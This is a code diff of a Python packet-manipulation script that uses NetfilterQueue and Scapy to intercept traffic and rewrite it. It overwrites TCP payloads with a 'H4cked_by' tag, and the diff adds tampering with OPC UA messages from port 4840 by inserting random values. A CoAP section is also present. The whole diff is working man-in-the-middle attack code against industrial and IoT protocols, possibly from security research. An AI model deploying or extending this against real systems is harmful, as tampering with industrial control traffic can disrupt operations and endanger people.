@@ -3,7 +3,7 @@ from netfilterqueue import NetfilterQueue
 from scapy.all import * 
 from scapy.layers import *
 import re
-
+import string
 def cleaner_regex_amqp(string):
     num = True
     result = re.sub("[^0-9]", "", string)
@@ -13,6 +13,12 @@ def cleaner_regex_amqp(string):
         num = False
 
     return result,num
+
+def get_random_string(length):
+    # With combination of lower and upper case
+    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
+    # print random string
+    return result_str
 
 
 #Analazing and modifying packets
@@ -68,14 +74,28 @@ def modify(packet):
         if pkt.haslayer(Raw):
             load = pkt[TCP][Raw].load
             if len(load) > 50:
-                print(len(load))
-                print("Al terminar" + str(load[35:]))
                 load = bytes(load[:35]) + 'H4cked_by_C4denaX_;P'.encode()
                 pkt[TCP][Raw].load = load
                 del pkt[IP].chksum
                 del pkt[TCP].chksum
                 packet.set_payload(bytes(pkt))
                 print("Se envia el nuevo paquete")
+                print(str(packet))
+    #OPC UA Manipulation packets
+    if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 4840:
+        print(pkt[TCP].show())
+        if pkt.haslayer(Raw):
+            load = pkt[TCP][Raw].load
+            if load[:5] == b'MSGFX':
+                print(load[73:])
+                load = bytes(load[:62]) + str(random.randint(1000000001,9999999999)).encode() + bytes(load[72:])  # load[62:72]
+                #print(pkt[TCP][Raw].load)
+                #print(load)
+                pkt[TCP][Raw].load = load
+                del pkt[IP].chksum
+                del pkt[TCP].chksum
+                packet.set_payload(bytes(pkt))
+                print("Paquete Enviado Modificado")
                 print(str(packet))
     #COAP Packet Manipulation of Get and Put Methods
     if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == 5683:
